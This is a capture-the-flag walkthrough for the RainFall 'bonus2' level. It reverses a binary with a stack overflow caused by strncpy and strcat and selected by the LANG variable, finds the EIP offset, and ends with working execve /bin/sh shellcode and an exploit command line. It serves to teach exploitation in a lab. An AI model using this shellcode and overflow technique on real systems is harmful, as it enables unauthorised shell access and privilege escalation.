# Walkthrought

## Reversing

```c
void greetuser(undefined param_1)
{
  undefined4 local_4c;
  undefined4 local_48;
  undefined4 local_44;
  undefined4 local_40;
  undefined2 local_3c;
  undefined local_3a;

  if (language == 1) {
    local_4c._0_1_ = 'H';
    local_4c._1_1_ = 'y';
    local_4c._2_1_ = 'v';
    local_4c._3_1_ = -0x3d;
    local_48._0_1_ = -0x5c;
    local_48._1_1_ = -0x3d;
    local_48._2_1_ = -0x5c;
    local_48._3_1_ = ' ';
    local_44._0_1_ = 'p';
    local_44._1_1_ = -0x3d;
    local_44._2_1_ = -0x5c;
    local_44._3_1_ = 'i';
    local_40 = 0xc3a4c376;
    local_3c = 0x20a4;
    local_3a = 0;
  }
  else if (language == 2) {
    local_4c._0_1_ = 'G';
    local_4c._1_1_ = 'o';
    local_4c._2_1_ = 'e';
    local_4c._3_1_ = 'd';
    local_48._0_1_ = 'e';
    local_48._1_1_ = 'm';
    local_48._2_1_ = 'i';
    local_48._3_1_ = 'd';
    local_44._0_1_ = 'd';
    local_44._1_1_ = 'a';
    local_44._2_1_ = 'g';
    local_44._3_1_ = '!';
    local_40 = CONCAT22(local_40._2_2_,0x20);
  }
  else if (language == 0) {
    local_4c._0_1_ = 'H';
    local_4c._1_1_ = 'e';
    local_4c._2_1_ = 'l';
    local_4c._3_1_ = 'l';
    local_48._0_3_ = 0x206f;
  }
  strcat((char *)&local_4c,&param_1);
  puts((char *)&local_4c);
  return;
}

int main(int argc,char **argv)
{
  int iVar1;
  char *__s1;
  undefined4 *puVar2;
  undefined4 *puVar3;
  byte bVar4;
  char *pcVar5;
  undefined4 local_60 [10];
  char acStack_38 [36];
  char *local_14;

  bVar4 = 0;
  if (argc == 3) {
    puVar2 = local_60;
    for (iVar1 = 19; iVar1 != 0; iVar1 = iVar1 + -1) {
      *puVar2 = 0;
      puVar2 = puVar2 + 1;
    }
    strncpy((char *)local_60,argv[1],40);
    strncpy(acStack_38,argv[2],32);
    pcVar5 = "LANG";
    __s1 = getenv("LANG");
    local_14 = __s1;
    if (__s1 != (char *)0x0) {
      iVar1 = memcmp(__s1,&DAT_0804873d,2);
      if (iVar1 == 0) {
        language = 1;
        pcVar5 = __s1;
      }
      else {
        pcVar5 = local_14;
        iVar1 = memcmp(local_14,&DAT_08048740,2);
        if (iVar1 == 0) {
          language = 2;
        }
      }
    }
    puVar2 = local_60;
    puVar3 = (undefined4 *)&stack0xffffff50;
    for (iVar1 = 19; iVar1 != 0; iVar1 = iVar1 + -1) {
      *puVar3 = *puVar2;
      puVar2 = puVar2 + (uint)bVar4 * -2 + 1;
      puVar3 = puVar3 + (uint)bVar4 * -2 + 1;
    }
    iVar1 = greetuser((char)pcVar5);
  }
  else {
    iVar1 = 1;
  }
  return iVar1;
}
```

The code is quite bad looking, but it's simple once you understand.

It does nothing if you don't provide 3 arguments, and if you do, it will
concatenate `40` bytes of `argv[1]` and `32` bytes of `argv[2]`. The
pseudo-code generated by ghidra might not look like that, but if you take a
closer look, you will see that `local_60`, has actually more size in the stack:
```raw
                **************************************************************
                *                          FUNCTION                          *
                **************************************************************
                int __cdecl main(int argc, char * * argv)
int               EAX:4          <RETURN>
int               Stack[0x4]:4   argc                                    XREF[1]:     08048538(R)  
char * *          Stack[0x8]:4   argv                                    XREF[2]:     0804855c(R), 
                                                                                      0804857c(R)  
undefined1        Stack[-0x10]:1 local_10                                XREF[1]:     08048630(*)  
undefined4        Stack[-0x14]:4 local_14                                XREF[4]:     080485ab(W), 
                                                                                      080485b2(R), 
                                                                                      080485cc(R), 
                                                                                      080485fb(R)  
undefined1        Stack[-0x60]:1 local_60                                XREF[4]:     08048548(*), 
                                                                                      08048570(*), 
                                                                                      08048590(*), 
                                                                                      0804861a(*)  
undefined4        Stack[-0xa8]:4 local_a8                                XREF[4]:     08048564(W), 
                                                                                      08048584(W), 
                                                                                      080485bc(W), 
                                                                                      080485eb(W)  
undefined4        Stack[-0xac]:4 local_ac                                XREF[4]:     0804856c(W), 
                                                                                      0804858c(W), 
                                                                                      080485c4(W), 
                                                                                      080485f3(W)  
undefined4        Stack[-0xb0]:4 local_b0                                XREF[5]:     08048574(*), 
                                                                                      08048597(*), 
                                                                                      0804859f(*), 
                                                                                      080485d3(*), 
                                                                                      08048602(*)  
```

It is in `-0x60`, and the variablo above in `-0x14`, that means, in decimal,
that `local_60` has `76` bytes. What happens it that ghidra has decided that a
part of a larger `char*` array is being used independently and has given that
smaller array its own label, `acStack_38`.

That's why is important to always look at the disassembler, and not only the
pseudo-code.

Looking again at the assembly, when calling the second `strncpy`, we see that
as the first argument it pases `local_60` + `0x28` (`40` in decimal).

So there you have it, that second `strncpy` is in reality `local_60 + 40`, and
`local_60` has `76` bytes of size.

```c
strncpy((char *)local_60,argv[1],40);
strncpy(acStack_38,argv[2],32); // acStack_38 == local_60 + 40
```

First `strncpy`:
```raw
0804856c 89 44 24 04     MOV        dword ptr [ESP + local_ac],EAX
08048570 8d 44 24 50     LEA        EAX=>local_60,[ESP + 0x50]
08048574 89 04 24        MOV        dword ptr [ESP]=>local_b0,EAX
08048577 e8 44 fe        CALL       <EXTERNAL>::strncpy                              char * strncpy(char * __dest, ch
         ff ff
```

Second `strncpy`:
```raw
0804858c 89 44 24 04     MOV        dword ptr [ESP + local_ac],EAX
08048590 8d 44 24 50     LEA        EAX=>local_60,[ESP + 0x50]
08048594 83 c0 28        ADD        EAX,0x28
08048597 89 04 24        MOV        dword ptr [ESP]=>local_b0,EAX
0804859a e8 21 fe        CALL       <EXTERNAL>::strncpy                              char * strncpy(char * __dest, ch
         ff ff
```

Notice the second `strncpy` has that extra `ADD EAX,0x28`.

Then the code gets an env variable (`LANG`), which can be:
- Nothing: for english
- `fi`: for other language which I don't know.
- `nl`: for other language which I don't know.

Then the `main` calls `greetuser`, which concatenates `hello` or its equivalent
in the corresponding language, with `local_60` (`param_1`). Again, look at
the `greetuser` call in asm, because in the pseudo-code is a little confused:
```raw
08048618 89 e2           MOV        EDX,ESP
0804861a 8d 5c 24 50     LEA        EBX=>local_60,[ESP + 0x50]
0804861e b8 13 00        MOV        EAX,19
         00 00
08048623 89 d7           MOV        EDI,EDX
08048625 89 de           MOV        ESI,EBX
08048627 89 c1           MOV        ECX,EAX
08048629 f3 a5           MOVSD.REP  ES:EDI,ESI
0804862b e8 54 fe        CALL       greetuser
         ff ff
```

And this is were things get interesting... `greetuser` is a mess.

As I just said I think it's just concatenating, and if we run the program it
corroborates my teory:
```bash
bonus2@RainFall:~$ ./bonus2 patata pato
Hello patata
```

Since the second argument its copied to `local_60 + 40`, we need to make sure
the `strncpy` does not null-terminate `argv[1]` when it copies it. To
achieve that, just remember a few levels back, `strncpy` does not copy the
null-terminate character if `str` is equal or bigger than the `size` parameter.

So let's make our first argument `40` bytes long:
```bash
bonus2@RainFall:~$ offset=$(printf "%40s" " " | tr ' ' 'A')
bonus2@RainFall:~$ ./bonus2 "${offset}" pato
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAApato
```

And there it is.

Further investigation reveals that the buffer where `hello` and `argv[1]+argv[2]`
gets concatenaned to, is at maximum `76` bytes, since the function it's a mess,
I can guaranteed more without looking too much at the assembly, but it's not
necessary, probably the buffer is smaller than that, but does not matter couse
copying a greetings message and a 76 buffer into another 76 buffer, will for
sure overflow, so let's get the EIP offset.

## Exploit

Our payload will consist of a first argument of `40` bytes size, and a payload
on the second one for the `shellcode`, but first, let's calculate the offset
with a pattern:
```bash
gdb -q ./bonus2

(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Program received signal SIGSEGV, Segmentation fault.
0x08006241 in ?? ()
```

That's (remember is little endian): `Ab...` Seems like the overflow hasn't
reached EIP for 2 bytes...

But remember the `hello` of the other two languages are larger, so by
concatenating to other lenguage we should be good, let's check what expects
the binary to be in `LANG` for the other two languages:
```raw
                     DAT_08048738                                    XREF[1]:     main:0804859f(*)  
08048738 4c              ??         4Ch    L
08048739 41              ??         41h    A
0804873a 4e              ??         4Eh    N
0804873b 47              ??         47h    G
0804873c 00              ??         00h
                     DAT_0804873d                                    XREF[1]:     main:080485c4(*)  
0804873d 66              ??         66h    f
0804873e 69              ??         69h    i
0804873f 00              ??         00h
                     DAT_08048740                                    XREF[1]:     main:080485f3(*)  
08048740 6e              ??         6Eh    n
08048741 6c              ??         6Ch    l
08048742 00              ??         00h
```

So, it can be either `fi` or `nl`, let's go for `fi` since the welcome message
appears to be larger.

To set or unset variables in gdb we can do:
```bash
(gdb) set environment LANG = fi
(gdb) show environment LANG
LANG = fi
```

And run again:
```bash
(gdb) r AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A

Starting program: /home/user/bonus2/bonus2 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2A
Hyvää päivää AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab

Program received signal SIGSEGV, Segmentation fault.
0x41366141 in ?? ()
```

Nice! We found `EIP`, and that's (remember it's little endian): `Aa6A`, which is
the 6 sequence, `6 * 3 = 18`, so `EIP` is at offset `18`.

Let's take our `./resources/getaddr.c`, and export our `shellcode`:

```bash
# Nop sled to ensure we hit the target
export SC=$(printf "%100s" " " | tr ' ' 'Z'; printf '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80')
gcc getaddr.c -o getaddr
./getaddr SC
```

The address is: `0xbffffe92`.

So, let's make our payload:
- `argv[1]`:
    - 40 bytes so `strncpy` does not null-terminate the string.
- `argv[2]`;
    - 18 offset bytes.
    - Address of `shellcode`

Let's take the address of `SC`, becasue `getaddr.c` does not seem to work for
this one, just place a breakpoint after it:
```bash
bonus2@RainFall:~$ gdb -q ./bonus2
Reading symbols from /home/user/bonus2/bonus2...(no debugging symbols found)...done.
(gdb) b *main
Breakpoint 1 at 0x8048529
(gdb) r a a
Starting program: /home/user/bonus2/bonus2 a a

Breakpoint 1, 0x08048529 in main ()
(gdb) x/20s *((char**)environ)
0xbffff7f7:	 "SHELL=/bin/bash"
0xbffff807:	 "TERM=xterm-256color"
0xbffff81b:	 "SSH_CLIENT=10.0.2.2 54006 4242"
0xbffff83a:	 "SSH_TTY=/dev/pts/0"
0xbffff84d:	 "USER=bonus2"
0xbffff859:	 "LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=01;31:*.arj=01;31"...
0xbffff921:	 ":*.taz=01;31:*.lzh=01;31:*.lzma=01;31:*.tlz=01;31:*.txz=01;31:*.zip=01;31:*.z=01;31:*.Z=01;31:*.dz=01;31:*.gz=01;31:*.lz=01;31:*.xz=01;31:*.bz2=01;31:*.bz=01;31:*.tbz=01;31:*.tbz2=01;31:*.tz=01;31:*.d"...
0xbffff9e9:	 "eb=01;31:*.rpm=01;31:*.jar=01;31:*.war=01;31:*.ear=01;31:*.sar=01;31:*.rar=01;31:*.ace=01;31:*.zoo=01;31:*.cpio=01;31:*.7z=01;31:*.rz=01;31:*.jpg=01;35:*.jpeg=01;35:*.gif=01;35:*.bmp=01;35:*.pbm=01;35"...
0xbffffab1:	 ":*.pgm=01;35:*.ppm=01;35:*.tga=01;35:*.xbm=01;35:*.xpm=01;35:*.tif=01;35:*.tiff=01;35:*.png=01;35:*.svg=01;35:*.svgz=01;35:*.mng=01;35:*.pcx=01;35:*.mov=01;35:*.mpg=01;35:*.mpeg=01;35:*.m2v=01;35:*.mk"...
0xbffffb79:	 "v=01;35:*.webm=01;35:*.ogm=01;35:*.mp4=01;35:*.m4v=01;35:*.mp4v=01;35:*.vob=01;35:*.qt=01;35:*.nuv=01;35:*.wmv=01;35:*.asf=01;35:*.rm=01;35:*.rmvb=01;35:*.flc=01;35:*.avi=01;35:*.fli=01;35:*.flv=01;35"...
0xbffffc41:	 ":*.gl=01;35:*.dl=01;35:*.xcf=01;35:*.xwd=01;35:*.yuv=01;35:*.cgm=01;35:*.emf=01;35:*.axv=01;35:*.anx=01;35:*.ogv=01;35:*.ogx=01;35:*.aac=00;36:*.au=00;36:*.flac=00;36:*.mid=00;36:*.midi=00;36:*.mka=00"...
0xbffffd09:	 ";36:*.mp3=00;36:*.mpc=00;36:*.ogg=00;36:*.ra=00;36:*.wav=00;36:*.axa=00;36:*.oga=00;36:*.spx=00;36:*.xspf=00;36:"
0xbffffd7a:	 "COLUMNS=120"
0xbffffd86:	 "PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games"
0xbffffdd3:	 "MAIL=/var/mail/bonus2"
0xbffffde9:	 "_=/usr/bin/gdb"
0xbffffdf8:	 "PWD=/home/user/bonus2"
0xbffffe0e:	 "LANG=fi\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\220\061\300Ph//shh/bin\211\343PS\211\341\260\v\315\200"
0xbffffe91:	 "LINES=99"
0xbffffe9a:	 "SC=", 'Z' <repeats 100 times>, "1\300Ph//shh/bin\211\343PS\211\341\260\v\315\200"
(gdb)
```

Cool! Indeed the address was a few bytes above, now just add something to the
address to make sure we land on the `NOP` sled, and that will be our
`shellcode` address!

```raw
bffffe9c --> bffffeac
```

```bash
export SC=$(python -c "print '\x90'*100+'\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'")
./bonus2 $(python -c "print 'A'*40") $(python -c "print 'A'*18+'\xac\xfe\xff\xbf'")
```

And... It worked! I tried
